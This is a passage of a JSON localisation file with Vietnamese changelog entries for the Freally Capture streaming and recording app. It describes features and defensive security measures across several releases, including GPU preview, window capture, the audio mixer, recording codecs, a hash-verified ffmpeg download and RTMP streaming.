hóa</strong> (TASK-609) — màu <strong>Rec.709</strong> được ghim trên mọi lượt mã hóa bằng codec truyền tải (không còn màu HD bị bạc/lệch), tùy chọn <strong>thu nhỏ đầu ra</strong> (ghi/phát ở độ phân giải khác với khung vẽ — theo từng đích phát), và các đường xử lý FPS cao (120/144/240) + 4K. HDR được ghi rõ một cách trung thực là nằm ngoài phạm vi (khung vẽ là SDR 8-bit).","changelog.e821097e85ca":"<strong>Đánh dấu chương khi ghi hình</strong> (TASK-610) — một phím tắt đánh dấu thả một chương vào bản ghi đang chạy (chương mkv, hoặc một tệp đi kèm đọc được cho các vùng chứa khác). Đánh dấu luồng phát phía nền tảng cần API tài khoản — bị loại theo điều lệ, và được nói rõ trung thực ngay trong sản phẩm.","changelog.9ee401a2a83a":"<strong>Lớp phủ chat trực tiếp</strong> (TASK-613) — một bản ghi trong suốt, có dấu thời gian, hiển thị trên khung vẽ cho phần chat livestream đang đến (tên người dùng + tin nhắn + dấu thời gian 12 giờ). <strong>Người dùng cuối không bao giờ cần khóa API, tài khoản nhà phát triển hay đăng nhập YouTube hoặc Twitch:</strong> YouTube được đọc qua một client InnerTube tự sở hữu giống hệt trình phát web, Twitch được đọc qua IRC ẩn danh, Kick được thăm dò qua endpoint công khai của nó. Một đợt chat dồn dập chỉ đẩy các dòng cũ ra ngoài — nó không bao giờ có thể làm nghẽn luồng phát, bản ghi hay lớp phủ.","changelog.fcfab0e66cef":"<strong>Lớp phủ biểu cảm bay lên</strong> (TASK-614) — emoji biểu cảm của người xem bay lên và mờ dần, <strong>được ghép thẳng vào chương trình</strong> (được ghi và phát), từ thanh biểu cảm trong ứng dụng hoặc được nhận ra trong cùng luồng nhận chat không cần khóa; một kho hạt có giới hạn nghĩa là một đợt biểu cảm dồn dập chỉ bị giới hạn ở số lượng hiển thị trên màn hình.","changelog.b7f3aacf8907":"Hoãn lại (nói thẳng)","changelog.d7babe268df3":"<strong>Chiều sâu camera ảo</strong> (TASK-611) — một camera ảo thực sự là một thành phần driver hệ điều hành có chữ ký (cột mốc riêng của nó). Mô hình nguồn cấp (chương trình / dọc / nguồn đơn lẻ) và điểm nối truyền tải theo từng hệ điều hành được phát hành ngay bây giờ; nút vẫn bị vô hiệu hóa với toàn bộ câu chuyện trong chú giải của nó.","changelog.d1bbc34e384f":"<strong>Nguồn trình duyệt</strong> (TASK-612) — một bản thử nghiệm thiết kế (<code>design/browser-source-spike.md</code>) đề xuất một bản nhúng thuộc lớp CEF được phát hành dưới dạng thành phần tải theo yêu cầu (giống ffmpeg); quyết định thuộc về Mike.","changelog.39e93c6d3eb9":"[0.70.0] — 2026-07-06 (Phát trực tiếp + Studio MVP — bản công khai đầu tiên)","changelog.2b4289185858":"Studio mà bạn có thể dùng để lên sóng: phát RTMP/RTMPS tới một đích, Chế độ Studio + chuyển cảnh bằng GPU, phím tắt toàn cục, hồ sơ + bộ sưu tập cảnh, một dock thống kê thực thụ — cùng toàn bộ tính năng cộng tác P2P <strong>Khách mời từ xa</strong> được hợp nhất từ Giai đoạn R.","changelog.1ab82763e794":"<strong>Phát tới một đích</strong> (RTMP/RTMPS tới Twitch/YouTube/Kick/Facebook/Trovo/Tùy chỉnh) với khóa phát được giữ bí mật và che đi, kết nối lại với thời gian chờ tăng dần, và tự động ghi khi Phát trực tiếp; bản ghi cục bộ không bao giờ bị ảnh hưởng bởi trạng thái phát.","changelog.5d254b2963c1":"<strong>Chế độ Studio + chuyển cảnh bằng GPU</strong> — một ô xem trước trực tiếp và một hiệu ứng chuyển cảnh khi đưa lên (cắt/mờ dần/trượt/quét/luma) mà khán giả nhìn thấy.","changelog.a95243dac70b":"<strong>Phím tắt toàn cục</strong> (ghi / Phát trực tiếp / chuyển cảnh) và một <strong>dock thống kê thực thụ</strong> (fps / khung hình rớt / ms kết xuất + % CPU / bộ nhớ của tiến trình này).","changelog.1bff268c26f0":"<strong>Hồ sơ + bộ sưu tập cảnh</strong> — cài đặt chuyển đổi được + ảnh chụp cảnh, được ghi nhớ qua các lần khởi động lại.","changelog.3e3cc955eb95":"<strong>Khách mời từ xa (Giai đoạn R)</strong> — cộng tác từ xa P2P/WebRTC phải chủ động bật: liên kết mời có hạn, micrô của khách vào bàn trộn, tắt tiếng hai cổng, Làm nổi bật người nói, bố cục màn hình-cộng-các-góc, và một relay TURN tùy chọn do chính người dùng sở hữu (không có hạ tầng nào do tác giả vận hành).","changelog.2fd6b77c5ce7":"[0.56.0] — 2026-07-06 (Bản xem trước GPU gốc + nâng cấp Chụp Cửa sổ)","changelog.6536f40e75b5":"Bản xem trước giờ <em>mang cảm giác</em> như OBS trên <strong>Windows, macOS và Linux</strong>: đầu ra GPU của bộ ghép hình được vẽ thẳng lên màn hình mà không qua vòng đọc lại/mã hóa — và Chụp Cửa sổ chọn cửa sổ bằng hình thu nhỏ trực tiếp, tồn tại qua khởi động lại và tự phục hồi.","changelog.c5202dd3e1c5":"Đã thêm — bản xem trước GPU gốc (“cảm giác OBS”) trên Windows, macOS và Linux","changelog.b77d015fe905":"<strong>Một bề mặt xem trước GPU gốc không sao chép</strong> thay thế bản xem trước đọc lại → JPEG → canvas bằng chính đầu ra GPU của bộ ghép hình được vẽ thẳng lên màn hình — không vòng mã hóa, không độ trễ. Theo từng hệ điều hành: <strong>Windows</strong> dùng một bề mặt <strong>DirectComposition</strong> (wgpu <code>SurfaceTargetUnsafe::CompositionVisual</code> trên DX12) được ghép <em>phía trên</em> WebView2, <strong>đã được xác minh thời gian thực trên phần cứng</strong>; <strong>macOS</strong> dùng một <strong>CAMetalLayer</strong> phủ trên WKWebView (Metal); <strong>Linux</strong> dùng một cửa sổ con X11 điều khiển một bề mặt <strong>Vulkan/GL</strong> (Wayland tạm thời giữ bản xem trước JPEG). Cả ba đều <strong>được CI chứng minh là kết xuất được</strong> — bài kiểm thử khói bằng ảnh chụp màn hình khẳng định các điểm ảnh thực tế ở mỗi lần push. <strong>Khung chọn + các tay nắm biến đổi tương tác được vẽ ngay trong chính khung hình GPU</strong> (chỉ trong bản xem trước — không bao giờ được ghi hay phát). Bên dưới, ngăn xếp GPU đã được <strong>nâng cấp wgpu 0.20 → 27</strong>. Bản xem trước JPEG vẫn là phương án dự phòng phổ quát và tự động quay lại bất cứ khi nào bề mặt gốc không khả dụng (GPU Windows không hỗ trợ DX12, Wayland, bề mặt bị mất).","changelog.0f1a68ade361":"Đã thêm — bộ chọn cửa sổ có hình thu nhỏ trực tiếp, liệt kê mọi cửa sổ","changelog.dc9f6df8df56":"<strong>Bộ chọn Chụp Cửa sổ giờ hiện hình thu nhỏ trực tiếp của mọi cửa sổ đang mở</strong> — một lưới ô gồm các khung hình được ghi thật, làm mới trong khi bộ chọn đang mở (được giãn cách để việc mở nó không dồn tải lên backend), kèm nút làm mới thủ công. Hình thu nhỏ được truyền dưới dạng <strong>URI JPEG <code>data:</code> trong bộ nhớ qua IPC — không có gì được ghi xuống đĩa</strong>, nên chúng biến mất ngay khi bộ chọn đóng lại.","changelog.3519efd99c8a":"<strong>Cửa sổ thu nhỏ giờ cũng được liệt kê</strong> (trước đây chúng bị lọc bỏ): Windows dùng kích thước khôi phục của cửa sổ khi nó đang thu nhỏ, macOS liệt kê các cửa sổ nằm ngoài màn hình, còn Linux/X11 vốn đã liệt kê chúng. Một <strong>tác vụ CI liệt kê cửa sổ</strong> chuyên biệt mở hai cửa sổ, thu nhỏ một cái, và khẳng định cả hai đều xuất hiện.","changelog.87f9b12b0ac3":"<strong>Viền ghi hình màu vàng của Windows đã biến mất</strong> — các phiên Windows.Graphics.Capture giờ yêu cầu không có viền (ở mức cố gắng tối đa; các bản dựng Windows cũ không hỗ trợ điều này giữ hành vi cũ).","changelog.a153cea5d4be":"Đã thêm — Chụp Cửa sổ gắn lại khi khởi động lại + tự phục hồi","changelog.3e74cf2927b9":"**Chụp Cửa sổ gắn lại vào <em>đúng</em> cửa sổ đó khi bạn mở lại ứng dụng<strong> — giống cách OBS Studio làm. Một handle cửa sổ của hệ điều hành (Windows <code>HWND</code>, macOS <code>CGWindowID</code>, X11 XID) chỉ có hiệu lực trong một phiên, nên một nguồn Cửa sổ đã lưu giờ cũng lưu </strong>danh tính bền vững<strong> của cửa sổ — tệp thực thi / ứng dụng sở hữu, lớp cửa sổ và tiêu đề của nó — và khi bắt đầu sẽ </strong>phân giải lại cửa sổ đang chạy bằng cách khớp danh tính đó**, neo theo ứng dụng để không bao giờ gắn vào một chương trình không liên quan (lớp + tiêu đề phân định khi có nhiều cửa sổ của cùng một ứng dụng). Các id chỉ có handle từ những cảnh đã lưu trước đây vẫn tải được. <em>Windows đã được xác minh trên phần cứng; macOS (ScreenCaptureKit) và Linux/X11 dùng chung bộ khớp và được xác thực trong CI; Wayland không bị ảnh hưởng — portal hệ thống của nó chọn lại nguồn và vốn đã bền vững.</em>","changelog.55f49748f04d":"<strong>Các nguồn ghi hình bị lỗi tự phục hồi.</strong> Một nguồn Chụp Màn hình / Chụp Cửa sổ / Ghi thiết bị video bị lỗi vì cửa sổ, màn hình hay camera của nó chưa có mặt sẽ <strong>được tự động thử lại</strong> (thời gian chờ tăng theo cấp số nhân cho từng nguồn, từ 3 s nhân đôi tới 60 s), nên nó lên sóng ngay khi cửa sổ mở lại hoặc thiết bị kết nối lại — không cần Thử lại thủ công (nút Thử lại vẫn được giữ để thúc thủ công khi cần). Các nguồn portal chọn màn hình và nguồn media không bị động tới.","changelog.e0a0ac02515e":"<strong>Một cửa sổ đang được ghi mà bị đóng giữa phiên giờ được phát hiện một cách tin cậy.</strong> Sự kiện đóng ghi hình của Windows không bao giờ kích hoạt với một số ứng dụng chạy quyền nâng cao / ẩn xuống khay hệ thống, điều lẽ ra sẽ để nguồn bị đứng hình ở trạng thái “trực tiếp” trên khung hình cuối cùng; nguồn ghi giờ cũng tự theo dõi chính handle cửa sổ và báo lỗi ngay khi cửa sổ thực sự biến mất — đó chính là điều kích hoạt cơ chế tự phục hồi ở trên.","changelog.67f786726842":"<strong>Con trỏ chuột giờ được theo dõi trong Chụp Cửa sổ — dù cửa sổ có được focus hay không.</strong> Windows chỉ ghép con trỏ vào bản ghi của cửa sổ <em>đang được focus</em> (cửa sổ không được focus không có con trỏ, và hoàn toàn không có khung hình khi nội dung của nó đứng yên), nên một ứng dụng đang được ghi mà bạn không nhấp vào trông như bị đứng hình. Freally Capture giờ <strong>tự vẽ con trỏ</strong>, giống cách OBS làm — hình dạng con trỏ thật (alpha, mặt nạ cổ điển và con trỏ đảo màu), được theo dõi trực tiếp và ghép vào khung hình, với các khung hình được tổng hợp khi chỉ có con trỏ di chuyển. Đo trên phần cứng: một cửa sổ không được focus đi từ ~0 lần cập nhật lên <strong>55 fps khi di chuyển nhanh / 32 fps ở tốc độ rê chuột</strong>. <strong>Chụp Màn hình</strong> cũng được xử lý tương tự: con trỏ vẫn tiếp tục di chuyển trong bản ghi ngay cả khi phần còn lại của màn hình nền đứng yên.","changelog.768c67ad0574":"[0.55.0] — 2026-07-03 (Bàn trộn âm thanh + ghi hình)","changelog.82a067a13f56":"Bậc 0.55.0 gồm <strong>Giai đoạn 3 (bàn trộn âm thanh + bộ lọc)</strong> cùng <strong>Giai đoạn 4 (ghi hình)</strong> — studio giờ có thể trộn và <strong>ghi</strong> nguồn cấp chương trình của nó xuống đĩa, nhiều rãnh, bằng bộ mã hóa phần cứng tốt nhất hiện có hoặc codec không mất dữ liệu tự sở hữu.","changelog.6550f4141d88":"Đã thêm — ghi hình (Giai đoạn 4)","changelog.8f276d78647e":"<strong>Codec không mất dữ liệu <code>freally-video</code> (<code>.frec</code>) tự sở hữu</strong> (<code>fcap-encode</code>): định dạng ghi cục bộ mặc định, được viết ngay tại đây và <strong>thuộc sở hữu hoàn toàn</strong> — sai phân khung hình theo thời gian + dự đoán điểm ảnh bên trái kiểu PNG + một tầng <strong>FLZ</strong> (LZ77) căn theo byte tự sở hữu, mọi kỹ thuật đều đã hết hạn bằng sáng chế từ hàng chục năm hoặc thuộc phạm vi công cộng, <strong>không phụ thuộc gì, không tải gì về</strong>, <code>#![forbid(unsafe_code)]</code>. Vùng chứa mang tối đa <strong>6 rãnh PCM stereo xen kẽ</strong> với vị trí mẫu tuyệt đối (đồng bộ hình-tiếng + tạm dừng liền mạch theo thiết kế), khung hình nội theo nhịp ~2 s, một chỉ mục tua, và một <strong>trình đọc chịu được tệp bị cắt cụt</strong> (một bản ghi bị sự cố vẫn phát được tới đoạn hoàn chỉnh cuối cùng; dữ liệu hỏng thì báo lỗi, không bao giờ panic, và việc cấp phát bộ nhớ bị giới hạn để chống tệp độc hại). Đã xác minh thời gian thực: một lượt mã hóa 1080p60 tổng hợp giữ được trong ngân sách.","changelog.8d5c44a0b1af":"<strong>Phát hiện bộ mã hóa + danh mục bộ mã hóa</strong>: một phép thăm dò GPU bằng <code>wgpu</code> (id nhà cung cấp + suy đoán theo tên, bỏ qua các trình rasterize phần mềm) điều khiển quy tắc đề xuất theo từng hệ điều hành — <strong>NVENC / Quick Sync / AMF</strong> trên Windows, <strong>NVENC / VAAPI</strong> (yêu cầu render node) trên Linux, <strong>VideoToolbox</strong> trên macOS — luôn đi kèm các phương án dự phòng CPU phổ quát <strong>x264 / x265 / AV1</strong>. Bộ mã hóa phần cứng được đề xuất như những ứng viên trung thực và <strong>được xác nhận bằng một lượt mã hóa thử thật 3 khung hình</strong> ở lần dùng đầu tiên (mức hỗ trợ khác nhau tùy GPU + driver); mọi bộ mã hóa codec truyền tải đều ghi rõ sự phụ thuộc vào ffmpeg.","changelog.14fd14e34068":"<strong>Ghép nhiều rãnh, vùng chứa và chia tệp</strong>: ghi ra <strong>mp4 / mkv / mov / webm</strong> (codec truyền tải) hoặc <strong><code>.frec</code></strong> tự sở hữu (không mất dữ liệu), với <strong>tối đa 6 rãnh âm thanh</strong>, và <strong>tự động chia tệp</strong> thành các đoạn độc lập phát được. Bộ máy ghi hình chạy một đồng hồ CFR nghiêm ngặt (số khung hình khóa theo thời gian đã ghi), nên hình-tiếng vẫn đồng bộ qua các lần khựng và <strong>tạm dừng/tiếp tục liền mạch trong cùng một tệp phát được</strong>. Bản ghi chính được thiết kế để tiếp tục bất kể trạng thái phát (tính năng phát trực tiếp có trong 0.70.0), và một <strong>bản sao cục bộ theo rãnh riêng</strong> được lưu cho nó.","changelog.a153199fe59d":"<strong>Cầu nối ffmpeg tải theo yêu cầu, được ghi nhãn rõ ràng</strong> (<code>fcap-encode::ffmpeg</code>): các codec truyền tải vướng bằng sáng chế (H.264/AAC/HEVC/AV1) chạy qua ffmpeg, vốn <strong>không bao giờ được đóng gói kèm</strong>. Ở lần dùng đầu tiên, nó được tải về từ một <strong>bản dựng được ghim theo từng hệ điều hành</strong> (URL + <strong>SHA-256 nhúng sẵn trong mã nguồn</strong>, đối chiếu chéo với checksum của chính bên phát hành), <strong>xác minh hash trước khi bất cứ thứ gì được chạy</strong> (không khớp sẽ hủy cài đặt), giải nén (chỉ một mục duy nhất — đường dẫn trong tệp nén không bao giờ được dùng để ghi), và được điều khiển như một <strong>tiến trình riêng</strong> (điều này cũng giữ giấy phép LGPL/GPL của nó tách biệt khỏi ứng dụng tự sở hữu). Một bảng <strong>Thành phần</strong> được ghi nhãn rõ ràng cho biết nó là gì, vì sao nó tồn tại, nguồn đã ghim, và tiến trình trực tiếp theo %/trên tổng/MB/s; đường ghi <code>.frec</code> tự sở hữu không cần đến bất kỳ thứ nào trong số đó.","changelog.823a023c395e":"<strong>Ghi HEVC / AV1 + remux sau khi ghi</strong>: HEVC và AV1 ghi qua đường ffmpeg được ghi nhãn (dùng phần cứng ở nơi GPU hỗ trợ); một danh sách <strong>Bản ghi</strong> (Điều khiển → Tệp…) hiển thị các tệp đã hoàn tất theo thứ tự mới nhất trước và đề nghị <strong>Remux sang MP4</strong> (mkv → mp4, <code>-c copy</code>, không mã hóa lại, faststart, thẻ <code>hvc1</code> cho HEVC). Lệnh remux kiểm tra rằng đường dẫn nằm bên trong thư mục bản ghi — webview không bao giờ có thể trỏ nó tới các tệp tùy ý.","changelog.8f8423224424":"<strong>Cài đặt bộ mã hóa + cấu hình sẵn</strong> (Cài đặt → Đầu ra): kiểm soát tốc độ bit <strong>CBR / VBR / CQP</strong> + bitrate + khoảng cách khung hình khóa, cấu hình sẵn theo từng bộ mã hóa <strong>Chất lượng / Cân bằng / Hiệu năng</strong> (ánh xạ vào núm chỉnh riêng của từng dòng bộ mã hóa), bitrate âm thanh theo từng rãnh, và các cấu hình ghi sẵn một cú nhấp <strong>Không mất dữ liệu / Chất lượng cao / Cân bằng</strong>. Điều khiển ghi hình trong dock: <strong>Bắt đầu / Dừng / Tạm dừng / Tiếp tục</strong>, chỉ báo <strong>REC</strong> nhấp nháy kèm thời lượng (không tính lúc tạm dừng) + số rãnh, và các tệp của phiên gần nhất hoặc lỗi trung thực của nó.","changelog.a6dabb1cab06":"<strong>Nguồn Media</strong> (<code>fcap-sources::media</code>) — được gộp vào từ Giai đoạn 2: một tệp video/ảnh được dựng trên khung vẽ <strong>với âm thanh của nó trong bàn trộn</strong>. Ảnh tĩnh được giải mã một lần (giống nguồn Ảnh); <strong><code>.frec</code> phát qua codec tự sở hữu</strong> mà không tải gì về; các định dạng truyền tải được giải mã qua thành phần ffmpeg được ghi nhãn (giải mã phần cứng <code>-hwaccel auto</code>, dự phòng bằng phần mềm, lặp/khởi động lại), và một bộ giám sát dừng bảo đảm một bộ giải mã bị treo không bao giờ làm treo studio. Âm thanh media chảy qua một <strong>trung tâm âm thanh media</strong> mới để một đoạn media có dải kênh bàn trộn đầy đủ (fader, bộ lọc, rãnh, độ lệch đồng bộ) mà không cần trường hợp đặc biệt nào.","changelog.78a7ab9818b8":"Đã thêm — bàn trộn âm thanh (Giai đoạn 3)","changelog.bb86ddd81916":"<strong>Bộ máy âm thanh tự sở hữu</strong> (<code>fcap-audio</code>): một đồ thị ghi âm <code>cpal</code> xử lý mọi thứ bên trong dưới dạng <strong>stereo f32 ở 48 kHz</strong> theo khối 10 ms. Ghi <strong>micrô / line-in</strong> (Đầu vào âm thanh) và <strong>âm thanh máy tính / hệ thống</strong> (Đầu ra âm thanh) theo từng nguồn, mỗi nguồn được chuyển đổi định dạng và lấy mẫu lại theo đồng hồ của bộ máy qua một <strong>bộ lấy mẫu lại tuyến tính dạng luồng tự sở hữu</strong>. Âm thanh máy tính được nói rõ trung thực theo từng hệ điều hành: <strong>Windows</strong> ghi bất kỳ thiết bị đầu ra nào qua <strong>WASAPI loopback</strong>; <strong>Linux</strong> dùng thiết bị <strong>monitor</strong> của PipeWire/PulseAudio; <strong>macOS</strong> cần một thiết bị loopback ảo (ví dụ BlackHole) cho tới khi có đường âm thanh ScreenCaptureKit — các bộ chọn nói rõ điều đó và lọc ra các thiết bị ảo đã biết.","changelog.4541b9b25062":"<strong>Đồ thị trộn</strong>: theo từng nguồn <strong>trễ độ lệch đồng bộ → chuỗi bộ lọc → nhấn để nói / nhấn để tắt tiếng / tắt tiếng / fader</strong>, được định tuyến vào <strong>tối đa 6 bus rãnh</strong> (gán theo từng nguồn), bản trộn <strong>chương trình (master)</strong>, và một bản trộn <strong>giám sát</strong>. Làm mượt mức khuếch đại ~8 ms không gây tiếng lách cách cho mọi lần tắt tiếng/PTT/di chuyển fader. Toàn bộ phần lõi là thuần túy và <strong>không phụ thuộc thiết bị — mọi quy tắc định tuyến đều được kiểm thử đơn vị mà không cần phần cứng</strong>.","changelog.805988055894":"<strong>Bộ lọc DSP cổ điển tự sở hữu — không có ML ở bất kỳ đâu, theo điều lệ</strong>: <strong>Khử ồn</strong> (triệt phổ STFT với FFT radix-2 tự sở hữu — khung √Hann 512 mẫu, chồng lấp 50%, theo dõi nền nhiễu theo từng bin + trừ phổ; tiếng ồn đều giảm xuống trong khi giọng nói đi qua), <strong>Cổng Nhiễu (Noise Gate)</strong> (độ trễ chuyển mạch + giữ), <strong>Bộ nén (Compressor)</strong> (cảm biến đỉnh, khuếch đại bù), <strong>Bộ giới hạn (Limiter)</strong> (attack tức thời với trần cứng), <strong>EQ 3-Băng</strong> (biquad shelf/peak RBJ), <strong>Khuếch đại</strong>, và <strong>Ducking</strong> sidechain (hạ một nguồn xuống dưới nguồn khác). Mọi bộ xử lý đều được kẹp giới hạn một cách phòng thủ để một cảnh chỉnh sửa bằng tay không thể tạo ra hiện tượng mất kiểm soát.","changelog.d379afe46aba":"<strong>Giám sát, ducking, PTT/PTM và LUFS</strong>: một <strong>đầu ra giám sát</strong> trên bất kỳ thiết bị nào (có giới hạn, an toàn khi thiếu dữ liệu); ducking sidechain được điều khiển bởi đường bao trực tiếp của nguồn kích hoạt; <strong>nhấn để nói / nhấn để tắt tiếng</strong> qua phím tắt toàn cục (được đăng ký từ mô hình, nói rõ trung thực việc Wayland không có phím tắt toàn cục); một đồng hồ <strong>LUFS có trọng số K theo BS.1770</strong> (tức thời + ngắn hạn) trên bản trộn chương trình; đo đỉnh/RMS theo từng nguồn.","changelog.df9eeebe72aa":"<strong>Bảng Bàn trộn âm thanh</strong>: một <strong>dải kênh</strong> cho mỗi nguồn âm thanh trong cảnh đang hoạt động — tên + trạng thái, một <strong>đồng hồ VU</strong> (xanh lá→vàng→đỏ, vạch đỉnh), một <strong>fader</strong> (−60…+6 dB), <strong>tắt tiếng</strong>, một nút xoay vòng <strong>giám sát</strong>, một hộp thoại <strong>bộ lọc âm thanh</strong> (cả 7 bộ lọc, với bộ chọn nguồn kích hoạt cho ducking), <strong>các chấm rãnh 1–6</strong>, và một popover nâng cao (độ lệch đồng bộ + phím tắt PTT/PTM). Một chỉ số <strong>LUFS</strong> và một bộ chọn <strong>thiết bị giám sát</strong> (được lưu trong cài đặt). Các nguồn âm thanh xuất hiện trong thanh Nguồn với cùng các chấm trạng thái trực tiếp như video, và trong menu <strong>Thêm nguồn</strong> với các bộ chọn thiết bị trung thực theo từng hệ điều hành.","changelog.97f0a5a2c868":"Mô hình cảnh/nguồn (<code>fcap-scene</code>) có thêm các loại nguồn <strong>Đầu vào âm thanh / Đầu ra âm thanh</strong> và một dải <strong><code>AudioSettings</code></strong> theo từng nguồn (fader, tắt tiếng, chế độ giám sát, mặt nạ bit rãnh, độ lệch đồng bộ, phím tắt PTT/PTM, chuỗi bộ lọc âm thanh có thứ tự) — được kiểm thử khứ hồi serde, kiểm tra định dạng camelCase trên đường truyền, kẹp theo phạm vi, và tự sửa chữa khi tải (trạng thái âm thanh tồn tại đúng trên các nguồn có khả năng âm thanh).","changelog.417eeb2ed567":"Bảo mật / quyền riêng tư","changelog.9fd51762b5f0":"Tư thế bảo mật không thay đổi và đã được xác minh lại: âm thanh được ghi + khung hình đã dựng <strong>chỉ</strong> chảy tới bàn trộn, thiết bị giám sát mà người dùng chọn, <strong>tệp bản ghi</strong>, và camera ảo — <strong>không có gì rời khỏi máy</strong>, không tài khoản, không thu thập dữ liệu sử dụng. Tên thiết bị giám sát được lưu trong cài đặt được kiểm tra độ dài/dạng; tổ hợp phím tắt được phân tích/kiểm tra trước khi đi vào mô hình.","changelog.ce84fae75efe":"<strong>Thao tác mạng duy nhất được thêm vào ở bậc này là việc tải ffmpeg tường minh, do người dùng nhấp</strong> — qua TLS từ một <strong>URL được mã hóa cứng, ghim theo từng hệ điều hành</strong>, <strong>được xác minh SHA-256 trước khi tệp nhị phân được thực thi</strong>, và được điều khiển như một tiến trình riêng. Nó không bao giờ tự khởi động; checksum không khớp sẽ hủy cài đặt. Đường ghi <code>.frec</code> tự sở hữu hoàn toàn không thực hiện lệnh gọi mạng nào.","changelog.bafa8e1e2feb":"Các rãnh âm thanh ffmpeg của bộ máy ghi hình đi qua <strong>các socket chỉ loopback (<code>127.0.0.1</code>)</strong> chỉ chấp nhận đúng một kết nối rồi đóng lại; cài đặt ghi hình (id bộ mã hóa, vùng chứa, bitrate, thư mục, tên tệp) được <strong>kiểm tra phạm vi/dạng</strong> trước khi dùng, và <strong>các thao tác remux/bản ghi bị giới hạn trong thư mục bản ghi</strong> (kiểm tra thư mục cha đã chuẩn hóa) để webview không thể chạm tới các tệp tùy ý. Các trình phân tích <code>.frec</code>/media coi byte của tệp là <strong>không đáng tin</strong> — giới hạn cấp phát, báo lỗi thay vì panic khi gặp dữ liệu hỏng.","changelog.ab6195393730":"Các phụ thuộc bên thứ ba mới, tất cả đều được ghi trong <code>THIRD-PARTY-NOTICES.md</code>: <strong><code>tauri-plugin-global-shortcut</code></strong> (nhấn để nói/tắt tiếng), và bộ tải/xác minh/giải nén của cầu nối ffmpeg (<strong><code>ureq</code></strong> + rustls, <strong><code>sha2</code></strong>, <strong><code>zip</code></strong>, <strong><code>tar</code></strong> + <strong><code>lzma-rs</code></strong>) cùng <strong><code>chrono</code></strong> (tên tệp theo giờ địa phương). DSP âm thanh và codec <strong><code>freally-video</code></strong> là <strong>hoàn toàn tự sở hữu</strong>; ffmpeg được <strong>điều khiển, không bao giờ đóng gói kèm</strong>.","changelog.282c879e15bb":"<strong>Kiểm thử khói âm thanh trên phần cứng thật</strong> (giữ ở trạng thái <code>--ignored</code> trên CI không màn hình) cùng một rào chắn mã hóa <code>.frec</code> 1080p60 ở chế độ release; toàn bộ quy trình tải ffmpeg trong ứng dụng → xác minh → ghi → phát lại là bài kiểm thử khói phát hành của Giai đoạn 4.","changelog.78915e8e8933":"[0.40.0] — 2026-07-02 (Bộ ghép hình + cảnh/nguồn)","changelog.64aed5d4e90f":"<strong>Bộ ghép hình GPU wgpu tự sở hữu</strong> (<code>fcap-compositor</code>): mọi mục cảnh đang hiển thị được ghép từ sau ra trước vào khung hình chương trình với <strong>di chuyển/co giãn/xoay/cắt</strong> theo từng mục (một phép biến đổi duy nhất có thẩm quyền, được kiểm thử đơn vị), cả bảy <strong>chế độ hòa trộn</strong> (normal/additive/subtract/screen/multiply/lighten/darken dưới dạng các trạng thái hòa trộn chức năng cố định), tải lên BGRA/RGBA có tính đến stride mà không cần hoán đổi kênh trên CPU, và một đường đọc lại không màn hình. Các bài kiểm thử golden khẳng định điểm ảnh GPU thật và bỏ qua một cách rõ ràng trên các máy không có adapter; cổng hiệu năng phần cứng giữ <strong>60 fps ở 1080p với 4 nguồn</strong> (đo được 5,2 ms/khung hình trên RTX 4070).","changelog.63af29da5231":"<strong>Mô hình cảnh/nguồn/bộ lọc tự sở hữu</strong> (<code>fcap-scene</code>): cảnh chứa các mục có thứ tự (chỉ số = thứ tự z); nguồn nằm trong một kho dùng chung và được tham chiếu qua các cảnh; mục mang biến đổi/hòa trộn/hiển thị/khóa và một chuỗi bộ lọc có thứ tự. Được kiểm thử khứ hồi serde, chịu được khóa không xác định, tự sửa chữa khi tải — đây là định dạng dự án bộ sưu tập cảnh, được tự động lưu (nguyên tử, có debounce) vào <code>scene-collection.json</code> trong thư mục cấu hình của hệ điều hành.","changelog.d4fa625cbe70":"<strong>Chuỗi bộ lọc video trên GPU</strong>, theo từng mục và tham số hóa trực tiếp: <strong>Khóa Chroma (Chroma Key)</strong> (có triệt tràn màu), <strong>Hiệu chỉnh Màu</strong> (gamma/độ sáng/độ tương phản/độ bão hòa/sắc độ/độ mờ đục), <strong>LUT</strong> (.cube → mạng 3D), <strong>Làm mờ</strong> (gaussian tách được), <strong>Mặt nạ Ảnh</strong> (alpha/độ sáng, đảo ngược), <strong>Làm nét</strong>, <strong>Cuộn</strong> (dòng chữ chạy quấn vòng), và <strong>Cắt</strong> — có thứ tự, bật/tắt được, mỗi bộ lọc được xác minh so với điểm ảnh đã kết xuất. Các bộ lọc mà tệp chưa được tải sẽ bị bỏ qua, không bao giờ kết xuất thành màu đen.","changelog.fe58cb003f91":"<strong>Nguồn mới</strong>: <strong>Ảnh</strong> (PNG/JPEG/BMP/GIF/WebP…), <strong>Màu</strong> (khối màu đặc), và <strong>Văn bản</strong> — tạo hình chữ thật qua rustybuzz (nối chữ Ả Rập, chữ ghép, kerning), bidi RTL theo UAX #9, ngắt dòng, căn lề, giãn dòng, raster hóa khử răng cưa bằng tiny-skia. <strong>Toàn bộ họ phông Noto Sans được đóng gói kèm</strong> (phông biến thiên: mọi độ đậm/độ rộng, đứng + Nghiêng + Ả Rập + Do Thái; OFL-1.1 được đưa vào mã nguồn, nguồn gốc được ghim + băm) với <strong>dự phòng chữ viết theo từng đoạn</strong>, để văn bản hiển thị giống hệt nhau trên mọi máy; các họ phông hệ thống vẫn chọn được và một tệp phông sẽ ghi đè.","changelog.4a4b0eca4f12":"<strong>Thời gian chạy của studio</strong>: các phiên ghi hình và nguồn tĩnh được đối chiếu với cảnh đang hoạt động ở mỗi nhịp; các mục mới thêm tự động vừa khung ở khung hình đầu tiên; khung hình chương trình đã dựng cấp vào cùng đường dẫn <code>preview://</code> trong tiến trình ở ~30 fps trong khi dựng ở ~60; trạng thái trực tiếp/đang chờ/lỗi theo từng nguồn + fps dựng hình được gửi trên sự kiện <code>program</code>. Một máy không có GPU nhận được báo cáo trung thực “không có GPU” thay vì một khung vẽ bị đứng hình.","changelog.42c0a344221a":"<strong>Giao diện studio</strong>: thanh <strong>Cảnh</strong> hoạt động được (thêm/chọn/đổi tên/sắp xếp lại/xóa), một thanh <strong>Nguồn</strong> với hiển thị/khóa/thứ tự z/trạng thái cho từng mục và một menu thêm bao gồm mọi loại đã được triển khai (cùng khả năng dùng chung nguồn giữa các cảnh), <strong>tay nắm biến đổi trên khung vẽ chính xác đến từng điểm ảnh</strong> (kéo, co giãn theo góc/cạnh, xoay với bắt dính 15°, Alt-kéo để cắt), một hộp thoại <strong>Bộ lọc</strong> (chế độ hòa trộn + chuỗi chỉnh sửa trực tiếp được), và các hộp thoại <strong>Thuộc tính</strong> theo từng loại.","changelog.eaef04a3aa25":"Ghi chú trung thực về phạm 